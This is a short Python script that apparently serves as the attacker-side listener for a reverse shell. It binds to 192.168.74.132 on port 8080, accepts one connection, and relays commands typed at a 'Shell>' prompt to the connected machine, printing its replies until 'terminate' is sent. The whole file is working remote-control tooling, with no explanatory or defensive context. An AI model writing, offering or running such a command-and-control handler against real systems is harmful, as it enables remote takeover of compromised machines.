#!/usr/bin/python

import socket

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("192.168.74.132", 8080))
        s.listen(1)
        print("[+] Listening for TCP connection on PORT 8080")
        
        conn, addr = s.accept()
        print("[+] Connection established with:", addr)

        while True:
            command = input("Shell> ").encode()  # Encode user input to bytes before sending
            if b'terminate' in command:
                conn.send(b'terminate')
                conn.close()
                break
            else:
                conn.send(command)
                response = conn.recv(1024)
                print(response.decode())  # Decode response bytes before printing
    except Exception as e:
        print("Error:", e)
    finally:
        s.close()

def main():
    connect()

if __name__ == "__main__":
    main()
